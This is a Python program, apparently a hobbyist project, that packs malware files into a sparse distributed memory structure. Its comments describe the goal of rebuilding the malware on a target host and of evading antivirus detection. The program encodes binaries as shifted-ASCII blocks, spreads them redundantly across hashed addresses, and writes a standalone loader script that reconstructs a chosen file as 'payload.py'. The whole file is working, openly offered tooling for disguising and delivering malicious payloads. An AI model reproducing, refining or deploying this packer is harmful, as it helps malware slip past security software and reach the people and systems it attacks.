import random

class SDM:

    def __init__(self, p, block_size):
        """
        This is the constructor for the Sparse Distributed Memory (SDM)
        that is going to store all of our desired malware files.
        """
        #Stores the number of addresses that the sdm will use.
        self.p = p

        #Stores the block size (in characters)
        #A block size of 32 equals 32 character blocks). This is used to break
        #Down the files, reducing their size.
        self.block_size = block_size

        #This creates a list of random binary addresses for the sdm to use using the index, i, as a seed.
        #The addresses have to be deterministic so that the same addresses can be recreated in
        #The file that will be used to recunstruct the malware on the target host.
        self.addresses = [self._generate_deterministic_address(i) for i in range(p)]

        #This initializes a list of empty dictionaries to hold stored data for each address.
        #Each dictionary will hold data blocks associated with a memory 
        #address, with their checksums acting as keys.
        self.data = [{} for _ in range(p)]

        #This sets the Hamming radius between addresses.
        #In this program, 30% of the bits in each block have to be the
        #same for it to be considered within the neighborhood of the value.
        self.radius = int(0.3 * block_size)


    def _generate_deterministic_address(self, index):
        """
        This is a helper method that generates a binary address that is the
        length of the specified block size.
        """
        #Generate a random number generator from the index seed (i in the list comprehension in the constructor):
        random.seed(index)
        #List comprehension that generates a list of binary values (0 or 1) for the lenth of the blocks:
        return [random.randint(0, 1) for _ in range(self.block_size)]


    def _calculate_checksum(self, block):
        """
        This is a helper method that calculates the checksum for a block of data.
        When storing data, the checksum is used to identify the block since it is used as a key for each stored data block.
        During retrieval, the checksum is used to verify whether the retrieved data matches the stored data. This is necessary
        to ensure that a noisy copy of the program isn't being retrieved.
        """
        #Calculates the sum of the ASCII values of all characters in the block. Then, it
        #reduces the sum using modulus (% 100000).
        return sum(ord(char) for char in block) % 100000


    def hamming_distance(self, a, b):
        """
        (According to the internet) this is a very concise way to compute the hamming distance between two vectors.
        Essentially, the hamming distance measures the number of positions where the two sequences have different values.
        """
        #First, this line pairs corresponding elements of a and b using zip.
        #Then, it compares each pair and checks if they are different (x != y).
        #Finally, it counts the number of differences using sum.
        return sum(x != y for x, y in zip(a, b))


    def enter(self, addressVector, data_block):
        """
        This method stores data (a 32 character block of information) into the SDM.
        It identifies which addresses in the SDM are "close" (within a certain Hamming distance) to the provided
        addressVector and stores the data_block there.
        It also uses a checksum to uniquely identify the data_block for verification and lookup.
        """
        #Calculate the checksum for the current data block:
        checksum = self._calculate_checksum(data_block)
        #This loops through all the memory addresses stored in self.addresses. It gets the current
        #address (stored_addr) and an index (i) using the built-in enumerate() function.
        for i, stored_addr in enumerate(self.addresses):
            #Checks if the address Vector is close enough to the current stored address in the addresses.
            if self.hamming_distance(addressVector, stored_addr) <= self.radius:
                #This line stores the data_block in the SDM at the current address's corresponding data dictionary.
                #It uses the block's checksum (in string form) as the key.
                self.data[i][str(checksum)] = data_block


    def retrieve(self, addressVector):
        """
        This method retrieves a stored data block from the SDM 
        using an input address vector. It does this by searching for all addresses in the SDM that are "close" (within 
        the specified Hamming radius) to the given address vector. It then retrieves 
        all the candidate blocks from those addresses and verifies their integrity using a checksum. Then, it
        selects the block that occurs most frequently (majority voting). This ensures (most likely) that the
        correctly formed block is retrieved, and not a malformed or noisy one. This part is important because, when reconstructing
        a script or execuatble on a target host, a malformed data block will result in a file with incorrect syntax, thus
        ruining the attack because the file will not execute.

        This method is not explicitely used in this program. Rather, it is inserted into the file this program creates
        containing the malicious sdm. I have included it here so the user may read my comments.
        """
        #Initialize a dictionary to count the occurrences of each retrieved block:
        block_counts = {}
        #Iterate over all stored addresses in self.addresses:
        for i, stored_addr in enumerate(self.addresses):
            #Check if the current stored address is "close" to the input address vector
            #by calculating the Hamming distance:
            if self.hamming_distance(addressVector, stored_addr) <= self.radius:
                #Iterate over all stored blocks (and their checksums) at the current address:
                for checksum, block in self.data[i].items():
                    #Validate the block's integrity by recalculating its checksum and comparing it
                    #to the stored checksum.
                    if int(checksum) == self._calculate_checksum(block):
                        #If the checksum is valid, update the count of this block in the block_counts dictionary.
                        #Use `dict.get()` to safely retrieve the current count (defaulting to 0).
                        block_counts[block] = block_counts.get(block, 0) + 1
        
        #If any valid blocks were found, return the block with the highest count (majority vote). That is the block that
        #will be used for the official file reconstruction.
        #If no valid blocks were found, return an empty string.
        return max(block_counts, key=block_counts.get) if block_counts else ""


def file_to_ascii_blocks(file_path, block_size=32):
    """
    This function reads a file in binary mode and converts its content into ASCII-compatible blocks. 
    Each byte of the file is transformed into a printable ASCII character by shifting its value up by 32. 
    The resulting string is then split into fixed-size blocks.

    This encoding ensures that binary data can be safely stored as text-like characters, 
    which is useful for storage in the SDM.
    """
    #Open the file located at file_path in binary read mode ('rb'). 
    #This ensures the file's raw bytes are read without any text encoding.
    with open(file_path, 'rb') as file:
        #Read the entire content of the file into a variable 'file_bytes' as raw bytes.
        file_bytes = file.read()

    #Convert each byte in the file to a printable ASCII character by shifting its value by 32.
    #The ord() function gets the ASCII code for each byte, and chr() shifts it to a printable range (32–126).
    #The resulting characters are joined together into a single string 'ascii_data'.
    ascii_data = ''.join(chr(byte + 32) for byte in file_bytes)

    #Split the transformed string 'ascii_data' into fixed-size blocks of length 'block_size'.
    #Use slicing with a step size of 'block_size' to create a list of blocks.
    return [ascii_data[i:i + block_size] for i in range(0, len(ascii_data), block_size)]



def ascii_blocks_to_file(blocks, output_path):
    """
    This function reconstructs a binary file from a list of ASCII-compatible blocks.
    Each character in the input blocks is converted back into its original byte value 
    by reversing the transformation (subtracting 32) that was applied earlier.

    The reconstructed bytes are then written to a new file in binary mode.
    """
    #Combine all blocks into a single ASCII-encoded string.
    #Each block is concatenated to form the full data string.
    ascii_data = ''.join(blocks)

    #Convert the ASCII-compatible characters back into their original byte values.
    #Subtract 32 from each character's ASCII value to reverse the earlier transformation.
    #Use ord() to get the ASCII value of the character, and bytearray() to assemble the bytes.
    byte_data = bytearray(ord(char) - 32 for char in ascii_data)

    #Open the output file at 'output_path' in binary write mode ('wb') to save the reconstructed data.
    with open(output_path, 'wb') as file:
        #Write the reconstructed binary data to the output file.
        file.write(byte_data)



def make_executable(addresses, data, keys, block_size, file_names):
    """
    This function takes the data, addresses, keys, block size and file name, and generates a 
    file capable of rebuilding all of the malware files stored in the sdm.
    """
    #Gets the string representation of all the parameters:
    addresses_str = repr(addresses)
    data_str = repr(data)
    keys_str = repr(keys)
    file_names_str = repr(file_names)

    script_content = f"""def hamming_distance(a, b):
    return sum(x != y for x, y in zip(a, b))

def calculate_checksum(block):
    return sum(ord(char) for char in block) % 100000

def reconstruct_file(addresses, data, key, radius):
    def retrieve_block(addressVector, addresses, data, radius):
        block_counts = {{}}
        for i, stored_addr in enumerate(addresses):
            if hamming_distance(addressVector, stored_addr) <= radius:
                for checksum, block in data[i].items():
                    if int(checksum) == calculate_checksum(block):
                        block_counts[block] = block_counts.get(block, 0) + 1
        return max(block_counts, key=block_counts.get) if block_counts else ""

    retrieved_blocks = [retrieve_block(key[i], addresses, data, radius) for i in range(len(key))]
    return ''.join(retrieved_blocks)

# SDM Data
addresses = {addresses_str}
data = {data_str}
keys = {keys_str}
file_names = {file_names_str}
radius = int(0.3 * {block_size})

# User selects the file key
print("Available files:")
for i, name in enumerate(file_names):
    print(f"  {{i + 1}}. {{name}}")

file_number = int(input("Enter the number for the file you want to reconstruct: ")) - 1

if file_number < 0 or file_number >= len(keys):
    print("Invalid selection. Exiting.")
else:
    key = keys[file_number]
    print(f"Reconstructing file: {{file_names[file_number]}}")
    reconstructed_data = reconstruct_file(addresses, data, key, radius)

    output_path = "payload.py"
    with open(output_path, "wb") as file:
        byte_data = bytearray(ord(char) - 32 for char in reconstructed_data)
        file.write(byte_data)

    print(f"File successfully reconstructed as '{{output_path}}'.")
"""

    #Write the script to a file:
    with open("neuro_loader.py", "w") as f:
        f.write(script_content)

    print("Executable script 'neuro_loader.py' has been created.")


def main():
    #The files list specifies all the malware files to be stored in the SDM.
    #Each file in this list will be processed, split into blocks, and stored in the SDM.
    #files = ["malware.txt", "malware2.txt", "malware3.txt"]
    #files = ["malware.txt"]
    files = [".exe"]
    
    #Set the block size for splitting the files into chunks.
    #Each block will contain 'block_size' characters (32, in this case).
    block_size = 32

    #Initialize an empty list to store the keys for each file.
    #Note: Each key is a list of binary address vectors used to store the file's blocks.
    keys = []

    #Initialize an empty list to store the names of the files.
    #This keeps track of which files are being processed and stored.
    file_names = []

    #Initialize the SDM with 5000 addresses and the specified block size.
    #The SDM will use these addresses to store blocks of data.
    sdm = SDM(p=5000, block_size=block_size)

    #Process each file in the list of files.
    for file in files:
        #Convert the file's binary content into ASCII-compatible, 32 character blocks.
        ascii_blocks = file_to_ascii_blocks(file, block_size)

        #Generate a list of random binary address vectors, one for each block in the file.
        #These vectors determine where the blocks will be stored in the SDM.
        address_vectors = [[random.randint(0, 1) for _ in range(block_size)] for _ in ascii_blocks]

        #Append the generated address vectors (keys) for this file to the keys list.
        #This is how the constructed executable file will be able to pick which piece of malware
        #to retrieve on the target host:
        keys.append(address_vectors)

        #Append the current file name to the file_names list for tracking purposes:
        file_names.append(file)

        print(f"Storing file: {file}")

        #For each block of ASCII-compatible data and its corresponding address vector,
        #store the block in the SDM.
        for address_vector, ascii_block in zip(address_vectors, ascii_blocks):
            #The 'enter' method stores the block at every address "close" to the address vector.
            sdm.enter(address_vector, ascii_block)

    #Generate a standalone executable script that can reconstruct files from the SDM.
    #The script includes the SDM addresses, stored data, keys, and file names.
    #HOPEFULLY it should not be viewed as malware by standard antivirus programs.
    make_executable(sdm.addresses, sdm.data, keys, block_size, file_names)



if __name__ == "__main__":
    main()
